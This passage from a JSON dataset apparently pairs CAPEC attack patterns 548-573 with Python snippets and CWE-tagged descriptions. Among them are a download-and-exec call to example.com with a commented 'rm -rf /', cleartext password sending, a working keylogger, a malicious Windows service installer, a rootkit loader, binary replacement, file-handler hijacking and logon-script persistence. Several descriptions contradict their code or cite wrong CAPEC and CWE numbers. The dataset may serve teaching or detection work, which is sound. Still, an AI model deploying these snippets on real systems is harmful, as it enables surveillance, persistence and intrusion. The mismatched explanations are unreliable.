        "description": "This Python code snippet represents the concept of 'Physical Destruction of Device or Component' by simulating the destruction of a device component. The 'DeviceComponent' class includes methods to destroy itself (CWE-1082) and to remove its data (CWE-1301). The '__del__' method is defined but does not act as a virtual destructor (CWE-1087). The code demonstrates how an adversary might attempt to destroy a device component and remove its data, but the data removal process may be incomplete, leaving sensitive information vulnerable."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-922: Insecure Storage of Sensitive Information\n# CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n\n# Sensitive information\nsensitive_data = 'UserPassword123'\n\n# Insecure storage of sensitive information\nwith open('sensitive_info.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# Cleartext transmission of sensitive information\ndef send_data(data):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('example.com', 80))\n    s.sendall(data.encode('utf-8'))\n    s.close()\n\n# Transmitting sensitive data\nsend_data(sensitive_data)\n\n# CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n# CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n\n# Reusing the file without clearing sensitive information\nwith open('sensitive_info.txt', 'r') as file:\n    reused_data = file.read()\n\n# Transmitting reused sensitive data\nsend_data(reused_data)",
        "description": "This Python code snippet demonstrates several security vulnerabilities related to the CAPEC 'Contaminate Resource'. The code stores sensitive information (a password) in a file without proper access control (CWE-922). It then transmits this sensitive information over a network in cleartext (CWE-319), making it susceptible to interception. Additionally, the code reuses the file containing sensitive information without clearing it first (CWE-226), and transmits the reused sensitive data again (CWE-402). This represents the main idea of the CAPEC by showing how mishandling sensitive information can contaminate resources and lead to security breaches."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\n# Malicious code embedded in the downloaded script\n# Example of what could be in malicious_script.py:\n# os.system('rm -rf /')",
        "description": "This Python code snippet demonstrates a scenario where malicious code is downloaded and executed on a local system, embodying the main idea of CAPEC-Local Execution of Code. The code downloads a Python script from a remote URL without performing any integrity checks (CWE-494). It then executes the downloaded script directly (CWE-829), which could contain embedded malicious code (CWE-506). This represents a significant security risk as the downloaded script could perform harmful actions, such as deleting files or installing malware. The example highlights the importance of verifying the integrity and trustworthiness of external code before execution."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "import os\nimport winreg\n\n# Vulnerable code: Install a new service with improper access control and default credentials\nservice_name = 'MyService'\nservice_executable = 'C:\\path\\to\\malicious.exe'\n\n# Open the registry key where services are registered\nkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\\CurrentControlSet\\Services', 0, winreg.KEY_SET_VALUE)\n\n# Create a new service entry\nnew_service_key = winreg.CreateKey(key, service_name)\nwinreg.SetValueEx(new_service_key, 'ImagePath', 0, winreg.REG_SZ, service_executable)\nwinreg.SetValueEx(new_service_key, 'Start', 0, winreg.REG_DWORD, 2)  # Auto-start\nwinreg.SetValueEx(new_service_key, 'ObjectName', 0, winreg.REG_SZ, 'LocalSystem')  # Run with elevated privileges\n\n# Close the registry keys\nwinreg.CloseKey(new_service_key)\nwinreg.CloseKey(key)\n\nprint(f'Service {service_name} installed and set to run at startup.')",
        "description": "This Python code snippet demonstrates the installation of a new service on a Windows system by modifying the registry. The service is set to auto-start with elevated privileges (LocalSystem). This embodies the CAPEC 'Install New Service' by showing how an adversary might install a malicious service that runs at startup. The code also highlights related CWEs: improper access control (CWE-284) by not restricting who can modify the registry, use of default credentials (CWE-1392) by running the service as LocalSystem, and initialization with insecure defaults (CWE-1188) by setting the service to auto-start without proper security measures."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-284: Improper Access Control\n# CWE-15: External Control of System or Configuration Setting\n# CWE-522: Insufficiently Protected Credentials\n\n# Function to modify an existing service\n# This function demonstrates improper access control and external control of system settings\n# by allowing unauthorized modification of a service configuration\n\ndef modify_service(service_name, new_command):\n    # CWE-522: Storing credentials insecurely\n    admin_password = 'admin123'  # Hardcoded password (vulnerable)\n\n    # CWE-284: No proper access control check\n    if not os.geteuid() == 0:\n        print(\"You need to have root privileges to modify services.\")\n        return\n\n    # CWE-15: External control of system configuration\n    service_file = f'/etc/systemd/system/{service_name}.service'\n    try:\n        with open(service_file, 'r') as file:\n            service_data = file.read()\n\n        # Modify the service command\n        service_data = service_data.replace('ExecStart=/usr/bin/old_command', f'ExecStart={new_command}')\n\n        with open(service_file, 'w') as file:\n            file.write(service_data)\n\n        # Reload the systemd manager configuration\n        subprocess.run(['systemctl', 'daemon-reload'], check=True)\n        print(f'Service {service_name} modified successfully.')\n    except Exception as e:\n        print(f'Failed to modify service: {e}')\n\n# Example usage\nmodify_service('example_service', '/usr/bin/new_command')",
        "description": "This Python code snippet demonstrates the concept of 'Modify Existing Service' by allowing the modification of a system service configuration. The function `modify_service` takes a service name and a new command to replace the existing command in the service configuration file. The code embodies several vulnerabilities:\n\n1. **CWE-284: Improper Access Control** - The code does not properly check for root privileges before modifying the service configuration.\n2. **CWE-15: External Control of System or Configuration Setting** - The function allows external input to control system configuration settings, which can be exploited by an attacker.\n3. **CWE-522: Insufficiently Protected Credentials** - The admin password is hardcoded and stored insecurely within the script.\n\nThis code snippet is a concise representation of how modifying existing services can introduce security vulnerabilities if proper controls are not in place."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-284: Improper Access Control\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-78: OS Command Injection\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n\ndef install_rootkit():\n    # Simulate improper access control by running as an unauthorized user\n    if os.geteuid() != 0:\n        print(\"Root privileges required.\")\n        return\n\n    # CWE-78: OS Command Injection vulnerability\n    malicious_command = \"echo 'malicious code' > /tmp/malware\"\n    os.system(malicious_command)\n\n    # CWE-506: Embedded Malicious Code\n    # CWE-507: Trojan Horse\n    # Load a malicious shared library (rootkit)\n    rootkit_path = \"/tmp/malicious_rootkit.so\"\n    ctypes.CDLL(rootkit_path)\n\n    print(\"Rootkit installed.\")\n\ninstall_rootkit()",
        "description": "This Python code snippet demonstrates the installation of a rootkit by exploiting several common vulnerabilities. The function `install_rootkit` first checks for root privileges, simulating improper access control (CWE-284). It then executes a command to write malicious code to a file, showcasing an OS Command Injection vulnerability (CWE-78). The code proceeds to load a malicious shared library, representing embedded malicious code (CWE-506) and a Trojan Horse (CWE-507). This rootkit can alter system behavior and hide its presence, aligning with the CAPEC description of installing a rootkit."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "import os\n\n# Function to check if user is admin\n# This is a client-side check and can be easily bypassed\n\ndef is_admin():\n    return os.getenv('USER') == 'admin'\n\n# Function to access restricted functionality\n\ndef access_restricted_functionality():\n    if is_admin():\n        print('Access granted to restricted functionality.')\n    else:\n        print('Access denied. Admin privileges required.')\n\n# Simulate an attacker bypassing the client-side check\nos.environ['USER'] = 'attacker'\naccess_restricted_functionality()",
        "description": "This Python code snippet demonstrates a functionality bypass vulnerability. The `is_admin` function checks if the user is an admin based on an environment variable, which is a client-side check. An attacker can easily bypass this check by modifying the environment variable, as shown in the simulation where the 'USER' is set to 'attacker'. This bypasses the intended protection and grants access to restricted functionality. This example embodies the CAPEC of 'Functionality Bypass' and highlights CWE-602 'Client-Side Enforcement of Server-Side Security'."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "import paramiko\n\n# Weak password requirements\nusername = 'user'\npassword = 'password123'  # CWE-521: Weak Password Requirements\n\n# Single-factor authentication\nclient = paramiko.SSHClient()\nclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\ntry:\n    # Insufficiently protected credentials\n    client.connect('example.com', username=username, password=password)  # CWE-522: Insufficiently Protected Credentials\n    stdin, stdout, stderr = client.exec_command('ls')\n    print(stdout.read().decode())\nfinally:\n    client.close()\n",
        "description": "This Python code snippet demonstrates a scenario where an attacker could use stolen credentials to access a remote service via SSH. The code uses the Paramiko library to establish an SSH connection with a server using a username and password. The password is weak (CWE-521) and the authentication method is single-factor (CWE-308). Additionally, the credentials are transmitted in a way that could be intercepted (CWE-522). This embodies the CAPEC of 'Remote Services with Stolen Credentials' by showing how an attacker could leverage weak security practices to gain unauthorized access to a system."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "import os\nimport winreg\n\ndef replace_file_handler(extension, new_handler_path):\n    try:\n        # Open the registry key where file handlers are stored\n        key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, extension, 0, winreg.KEY_SET_VALUE)\n        # Set the new handler for the file extension\n        winreg.SetValue(key, '', winreg.REG_SZ, new_handler_path)\n        winreg.CloseKey(key)\n        print(f'File handler for {extension} replaced with {new_handler_path}')\n    except Exception as e:\n        print(f'Failed to replace file handler: {e}')\n\n# Example usage\nreplace_file_handler('.txt', 'C:\\path\\to\\malicious_program.exe')",
        "description": "This Python code snippet demonstrates how to replace the file handler for a specific file extension in the Windows registry. The function `replace_file_handler` takes a file extension and a new handler path as arguments. It opens the registry key associated with the file extension and sets the new handler path. This action can be exploited by an attacker to execute arbitrary programs when a file with the specified extension is opened. The code embodies the main idea of the CAPEC 'Replace File Extension Handlers' by showing how an application can modify file handlers to call an arbitrary program. The related CWEs are represented by the potential for improper access control (CWE-284), reliance on file name or extension (CWE-646), and external control of file name or path (CWE-73)."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import os\nimport subprocess\n\n# Using an obsolete function to schedule a task\n# This is a vulnerable practice as it may not be secure or maintained\n# CWE-477: Use of Obsolete Function\n# CWE-1101: Reliance on Runtime Component in Generated Code\n\ndef schedule_task(command):\n    try:\n        # Using 'at' command which is considered obsolete in many systems\n        subprocess.run(['at', 'now + 1 minute'], input=command.encode(), check=True)\n    except subprocess.CalledProcessError as e:\n        print(f\"Failed to schedule task: {e}\")\n\n# Example usage\nschedule_task('echo Vulnerable Task Scheduled')",
        "description": "This Python code snippet demonstrates the use of an obsolete function to schedule a task, which embodies the main idea of the deprecated CAPEC 'Schedule Software To Run'. The code uses the 'at' command, which is considered obsolete (CWE-477: Use of Obsolete Function). Additionally, it relies on the runtime component 'subprocess' to execute the command (CWE-1101: Reliance on Runtime Component in Generated Code). This practice is vulnerable as it may not be secure or maintained, and it highlights the risks associated with using deprecated or obsolete functions."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "import os\nimport shutil\n\n# CWE-284: Improper Access Control\n# Assume the script has elevated privileges\ntrusted_executable_path = '/usr/bin/trusted_executable'\nmalicious_executable_path = '/tmp/malicious_executable'\n\n# CWE-78: OS Command Injection\n# CWE-114: Process Control\n# Replace the trusted executable with a malicious one\ntry:\n    if os.path.exists(trusted_executable_path):\n        shutil.copy(malicious_executable_path, trusted_executable_path)\n        os.chmod(trusted_executable_path, 0o755)  # Ensure the malicious executable is executable\n        print('Trusted executable replaced with malicious version.')\n    else:\n        print('Trusted executable not found.')\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a scenario where an attacker exploits improper access control (CWE-284) to replace a trusted executable with a malicious one. The script assumes it has elevated privileges, allowing it to overwrite the trusted executable located at '/usr/bin/trusted_executable' with a malicious version from '/tmp/malicious_executable'. The code also ensures the malicious executable has the correct permissions to be executed (CWE-78 and CWE-114). This represents the main idea of the CAPEC 'Replace Trusted Executable', where an adversary replaces a trusted executable to execute malware."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "import socket\n\n# Simulate a rogue uplink station sending disruptive signals\nclass RogueUplinkStation:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n\n    def send_disruptive_signal(self, message):\n        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:\n            sock.sendto(message.encode(), (self.target_ip, self.target_port))\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.100'  # IP of the target satellite communication endpoint\n    target_port = 12345  # Port of the target satellite communication endpoint\n    rogue_station = RogueUplinkStation(target_ip, target_port)\n    disruptive_message = 'DISRUPTIVE SIGNAL'\n    rogue_station.send_disruptive_signal(disruptive_message)\n",
        "description": "This Python code snippet simulates a rogue uplink station sending disruptive signals to a target satellite communication endpoint. The `RogueUplinkStation` class is initialized with the target IP and port, and the `send_disruptive_signal` method sends a disruptive message to the target using a UDP socket. This represents the CAPEC 'Orbital Jamming' attack pattern, where an adversary disrupts satellite communications. The code also indirectly touches on related CWEs, such as improper verification of the source of a communication channel (CWE-940) and improper restriction of communication channel to intended endpoints (CWE-923), by not verifying the legitimacy of the sender and allowing unauthorized communication."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "import hashlib\nimport time\n\n# Simulate a database of user credentials\nuser_db = {\n    'user1': hashlib.sha256('password123'.encode()).hexdigest(),\n    'user2': hashlib.sha256('mypassword'.encode()).hexdigest()\n}\n\n# Function to authenticate user\nfailed_attempts = {}\n\ndef authenticate(username, password):\n    global failed_attempts\n    current_time = time.time()\n    if username in failed_attempts and current_time - failed_attempts[username]['last_attempt'] < 60:\n        if failed_attempts[username]['count'] >= 5:\n            print('Account locked due to too many failed attempts. Try again later.')\n            return False\n    else:\n        failed_attempts[username] = {'count': 0, 'last_attempt': current_time}\n\n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    if username in user_db and user_db[username] == hashed_password:\n        print('Authentication successful')\n        failed_attempts[username] = {'count': 0, 'last_attempt': current_time}\n        return True\n    else:\n        print('Authentication failed')\n        failed_attempts[username]['count'] += 1\n        failed_attempts[username]['last_attempt'] = current_time\n        return False\n\n# Example usage\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'password123')",
        "description": "This Python code snippet demonstrates a simple authentication system that embodies the main idea of CAPEC-Use of Known Domain Credentials. The code includes a user database with hashed passwords and an authentication function that checks the provided credentials against the stored ones. It also implements a basic mechanism to track failed authentication attempts and lock the account after a certain number of failed attempts within a short time frame, addressing CWE-307 (Improper Restriction of Excessive Authentication Attempts). The code uses single-factor authentication (CWE-308) and relies on password-based authentication (CWE-309), which are both highlighted as weaknesses. The code does not implement password aging (CWE-262) or multi-factor authentication (CWE-654), making it more vulnerable to attacks if credentials are guessed or obtained by an adversary."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "import os\nimport getpass\nimport smbclient\n\n# CWE-522: Insufficiently Protected Credentials\nusername = input('Enter admin username: ')\npassword = getpass.getpass('Enter admin password: ')\n\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\ntry:\n    smbclient.ClientConfig(username=username, password=password)\n    with smbclient.open_file(r'\\\\target_machine\\C$\\sensitive_file.txt', mode='r') as file:\n        data = file.read()\n        print(data)\nexcept smbclient.SMBAuthenticationError:\n    print('Authentication failed')\n\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\n# CWE-521: Weak Password Requirements\n# Note: These issues are not directly represented in the code but are implied by the use of simple password-based authentication.",
        "description": "This Python code snippet demonstrates a scenario where an adversary uses stolen or guessed Windows administrator credentials to access Windows Admin Shares. The code uses the `smbclient` library to connect to a remote machine's admin share (C$) and read a sensitive file. The code highlights several security weaknesses: \n1. CWE-522: Credentials are input and stored in a manner that could be insecure.\n2. CWE-308 and CWE-309: The code uses single-factor authentication with a password, which is a weak authentication method.\n3. CWE-263, CWE-262, and CWE-521: These weaknesses are implied by the use of simple password-based authentication without additional security measures like password aging or strong password requirements. The code represents the main idea of the CAPEC by showing how an attacker could exploit these weaknesses to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-378: Creation of Temporary File With Insecure Permissions\n# Create a temporary file in a shared directory with insecure permissions\nshared_dir = '/tmp/shared'\nos.makedirs(shared_dir, exist_ok=True)\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-494: Download of Code Without Integrity Check\n# CWE-284: Improper Access Control\n# CWE-433: Unparsed Raw Web Content Delivery\n# Upload a malicious script to the shared directory\nmalicious_script = '''#!/bin/bash\necho \"Malicious code executed\"\n'''\n\n# Create a temporary file with insecure permissions\nwith tempfile.NamedTemporaryFile(dir=shared_dir, delete=False) as temp_file:\n    temp_file.write(malicious_script.encode('utf-8'))\n    temp_file_name = temp_file.name\n\n# Set insecure permissions\nos.chmod(temp_file_name, 0o777)\n\nprint(f\"Malicious script uploaded to {temp_file_name}\")",
        "description": "This Python code snippet demonstrates a scenario where an adversary manipulates files in a shared location by adding a malicious script. The code creates a temporary file in a shared directory with insecure permissions (CWE-378). It then uploads a malicious script to this shared directory (CWE-434, CWE-494) and sets the file permissions to be fully open (CWE-284). The script is stored in a way that could be executed by any user accessing the shared directory (CWE-433). This embodies the main idea of the CAPEC 'Modify Shared File' by showing how an attacker can place malicious content in a shared location, potentially leading to its execution by unsuspecting users."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/var/www/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/uploads/<filename>')\ndef uploaded_file(filename):\n    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows users to upload files to a directory under the web root and then access those files via a URL. The '/upload' endpoint handles file uploads, saving them to the '/var/www/uploads' directory. The '/uploads/<filename>' endpoint serves the uploaded files. This code embodies the main idea of the CAPEC 'Add Malicious File to Shared Webroot' by allowing an adversary to upload potentially malicious files to a web-accessible directory. The related CWEs are represented as follows: CWE-284 (Improper Access Control) is shown by the lack of access control on the upload directory, CWE-219 (Storage of File with Sensitive Data Under Web Root) is demonstrated by storing uploaded files under the web root, CWE-433 (Unparsed Raw Web Content Delivery) is represented by serving files without parsing, CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) is shown by saving files based on their original names, and CWE-494 (Download of Code Without Integrity Check) is implied by the lack of integrity checks on uploaded files."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "import os\n\n# CWE-798: Use of Hard-coded Credentials\nADMIN_CREDENTIALS = {'username': 'admin', 'password': 'admin123'}\n\n# CWE-284: Improper Access Control\nlogon_script_path = '/etc/profile.d/logon_script.sh'\n\n# Check if the logon script is writable\nif os.access(logon_script_path, os.W_OK):\n    with open(logon_script_path, 'a') as logon_script:\n        # CWE-259: Use of Hard-coded Password\n        logon_script.write('\\n# Malicious code to maintain persistence\\n')\n        logon_script.write('echo \"Malicious code executed\"\\n')\n        logon_script.write('export MALICIOUS_VAR=1\\n')\nelse:\n    print('Logon script is not writable')",
        "description": "This Python code snippet demonstrates a scenario where an attacker exploits improper access control (CWE-284) to modify a logon script, which is executed every time a user logs in. The script checks if the logon script is writable and appends malicious code to it. The use of hard-coded credentials (CWE-798) and hard-coded password (CWE-259) is shown by the presence of static admin credentials, which could be used to gain access to the system. This embodies the main idea of the CAPEC 'Run Software at Logon', where an attacker can insert code into logon scripts to maintain persistence or move laterally within a network."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "import time\n\n# List of common passwords to try\ncommon_passwords = ['password123', '123456', 'qwerty', 'letmein', 'welcome']\n\n# List of user accounts\nuser_accounts = ['user1', 'user2', 'user3', 'user4', 'user5']\n\n# Function to simulate password spraying attack\nfor password in common_passwords:\n    for user in user_accounts:\n        # Simulate an authentication attempt\n        print(f'Trying password \"{password}\" for user \"{user}\"')\n        # Simulate a delay to avoid rapid account lockouts\n        time.sleep(1)\n    # Simulate a longer delay before trying the next password\n    time.sleep(5)\n\nprint('Password spraying attack simulation complete.')",
        "description": "This Python code snippet simulates a password spraying attack, where an adversary tries a small list of common passwords against a list of user accounts. The code iterates over each password and attempts to authenticate each user with that password, introducing a delay between attempts to avoid rapid account lockouts. This approach helps the attacker remain undetected. The code embodies the main idea of CAPEC-111 (Password Spraying) and highlights related weaknesses such as weak password requirements (CWE-521), improper restriction of excessive authentication attempts (CWE-307), and reliance on single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import hashlib\n\n# Example of using a one-way hash without a salt\npassword = 'user_password'\nhash_object = hashlib.sha256(password.encode())\nhash_password = hash_object.hexdigest()\nprint(f'Hashed password: {hash_password}')",
        "description": "This Python code snippet demonstrates the use of a one-way cryptographic hash (SHA-256) to hash a password without using a salt. This approach is vulnerable because it does not incorporate a salt, making it susceptible to precomputed hash attacks (e.g., rainbow tables). The code embodies the deprecated CAPEC concept of 'Dump Password Hashes' by showing how password hashes can be generated insecurely. The related CWE-759 ('Use of a One-Way Hash without a Salt') is directly illustrated here, highlighting the importance of using a salt to enhance security."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import os\nimport subprocess\n\n# Vulnerable code: Using obsolete function 'os.popen' to obtain data\n# CWE-477: Use of Obsolete Function\n# CWE-493: Critical data is not protected\n\n# This function uses os.popen, which is deprecated and insecure\n# It also does not protect the confidentiality of the data obtained\n\ndef get_system_info():\n    # Using an obsolete function to execute a system command\n    result = os.popen('uname -a').read()\n    return result\n\n# Example usage\nsystem_info = get_system_info()\nprint(system_info)",
        "description": "This Python code snippet demonstrates the use of an obsolete function 'os.popen' to obtain system information, which is a deprecated and insecure method (CWE-477). The function 'get_system_info' executes a system command to retrieve system information without protecting the confidentiality of the data (CWE-493). This embodies the main idea of the deprecated CAPEC 'Obtain Data via Utilities' by showing how deprecated functions can be used to obtain sensitive data without proper security measures."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import pynput.keyboard as keyboard\n\nclass Keylogger:\n    def __init__(self):\n        self.log = \"\"\n\n    def on_press(self, key):\n        try:\n            self.log += key.char\n        except AttributeError:\n            if key == key.space:\n                self.log += ' '\n            else:\n                self.log += ' ' + str(key) + ' '\n\n    def start(self):\n        with keyboard.Listener(on_press=self.on_press) as listener:\n            listener.join()\n\nif __name__ == \"__main__\":\n    keylogger = Keylogger()\n    keylogger.start()",
        "description": "This Python code snippet demonstrates a simple keylogger using the 'pynput' library to capture keystrokes. The 'Keylogger' class initializes an empty log and defines an 'on_press' method to append each keystroke to the log. The 'start' method begins listening for keyboard events. This code embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by capturing all keystrokes made by a user, which can then be analyzed to extract credentials. The related CWEs provide context on potential weaknesses in authentication mechanisms that could be exploited by such a keylogger, such as weak password requirements (CWE-521) and insufficiently protected credentials (CWE-522)."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "import os\nimport getpass\n\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# Collecting sensitive information from the user\nusername = input('Enter your username: ')\npassword = getpass.getpass('Enter your password: ')\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Storing sensitive information in a file with improper permissions\nwith open('credentials.txt', 'w') as f:\n    f.write(f'Username: {username}\\n')\n    f.write(f'Password: {password}\\n')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Executing a command that exposes sensitive information\nos.system(f'echo Username: {username} Password: {password}')",
        "description": "This Python code snippet demonstrates the CAPEC concept of 'Collect Data as Provided by Users' by collecting sensitive information (username and password) from the user. The code then improperly handles this sensitive information in several ways, embodying the related CWEs. It stores the credentials in a file with potentially improper permissions (CWE-200), and it invokes a system command that exposes the sensitive information (CWE-214). Additionally, it exposes sensitive system information to an unauthorized control sphere by printing the credentials to the console (CWE-497). This code highlights the risks of improperly handling and exposing sensitive user data."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import hashlib\nimport socket\n\n# CWE-477: Use of Obsolete Function\n# Using MD5 which is considered obsolete and insecure\npassword = 'password123'\nhash_object = hashlib.md5(password.encode())\nprint(f'MD5 Hash: {hash_object.hexdigest()}')\n\n# CWE-247: Reliance on DNS Lookups in a Security Decision\n# Making a security decision based on DNS lookup\nhostname = 'example.com'\ntry:\n    ip_address = socket.gethostbyname(hostname)\n    if ip_address == '192.168.1.1':\n        print('Access granted')\n    else:\n        print('Access denied')\nexcept socket.error as e:\n    print(f'Error resolving hostname: {e}')\n\n# CWE-391: Unchecked Error Condition\n# Ignoring potential errors from the DNS lookup\ntry:\n    ip_address = socket.gethostbyname(hostname)\nexcept socket.error:\n    pass  # Error is ignored, which is a bad practice",
        "description": "This Python code snippet demonstrates several deprecated and insecure practices as described in the CAPEC and related CWEs. It uses the obsolete MD5 hashing function (CWE-477), makes a security decision based on a DNS lookup (CWE-247), and ignores potential errors from the DNS lookup (CWE-391). The code highlights the risks associated with using outdated functions, relying on DNS for security decisions, and not properly handling errors, which can lead to vulnerabilities and potential exploitation."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "import logging\nimport os\n\n# CWE-778: Insufficient Logging\nlogging.basicConfig(filename='app.log', level=logging.ERROR)\n\n# Function to simulate blocking log delivery to central repository\n# CAPEC: Block Logging to Central Repository\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n# CWE-532: Insertion of Sensitive Information into Log File\n# CWE-294: Authentication Bypass by Capture-replay\n\ndef block_log_delivery():\n    try:\n        # Simulate blocking log delivery by removing write permissions\n        os.chmod('app.log', 0o000)\n        logging.error('Log delivery to central repository blocked.')\n    except Exception as e:\n        print(f'Error blocking log delivery: {e}')\n\n# CWE-779: Logging of Excessive Data\nfor i in range(1000):\n    logging.error(f'Excessive log entry {i}')\n\nblock_log_delivery()",
        "description": "This Python code snippet demonstrates the concept of blocking log delivery to a central repository, as described in the CAPEC. The logging configuration is set to log only errors (CWE-778: Insufficient Logging). The `block_log_delivery` function simulates blocking log delivery by changing the file permissions of the log file to prevent writing (CAPEC: Block Logging to Central Repository). The code also includes excessive logging to illustrate CWE-779: Logging of Excessive Data. The function logs an error message indicating that log delivery has been blocked, which could expose sensitive information (CWE-532). Additionally, the code does not handle potential replay attacks (CWE-294) and exposes the log file to unauthorized access (CWE-527)."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "import os\n\n# Function to artificially inflate file size\ndef inflate_file_size(file_path, inflate_size):\n    try:\n        with open(file_path, 'ab') as f:\n            f.write(b'\\0' * inflate_size)\n        print(f\"File {file_path} inflated by {inflate_size} bytes.\")\n    except Exception as e:\n        print(f\"Error inflating file: {e}\")\n\n# Example usage\nfile_path = 'example.txt'\n# Create a file if it doesn't exist\nif not os.path.exists(file_path):\n    with open(file_path, 'w') as f:\n        f.write('Initial content')\n\n# Inflate the file size by 1MB\ninflate_file_size(file_path, 1024 * 1024)",
        "description": "This Python code snippet demonstrates how an adversary might artificially inflate the size of a file by appending null bytes to it. The `inflate_file_size` function takes a file path and a size in bytes to inflate the file by. It opens the file in append-binary mode and writes the specified number of null bytes to it. This can lead to a Denial of Service condition on systems with limited storage capacity. The code also includes a check to create the file if it does not already exist, ensuring the function can be demonstrated. This snippet embodies the CAPEC 'Artificially Inflate File Sizes' and touches on CWE-774 by not imposing any restrictions on file size, potentially leading to resource exhaustion."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "import os\n\n# Function to list all running processes\n# This function exposes sensitive information about the system's processes\n# to any user who runs this script, which can be exploited by an adversary.\ndef list_processes():\n    processes = os.popen('ps aux').read()\n    return processes\n\n# Main function to demonstrate the vulnerability\ndef main():\n    # Exposing sensitive system information to unauthorized users\n    print(\"Listing all running processes:\")\n    print(list_processes())\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Process Footprinting' (CAPEC-). The function 'list_processes' uses the 'ps aux' command to list all running processes on the system. This information is then printed to the console, exposing sensitive system information to any user who runs the script. This can be exploited by an adversary to learn about the target environment, which aligns with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The code represents the main idea of the CAPEC by showing how an adversary can gain insights into the system's processes, potentially leading to further malicious activities."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
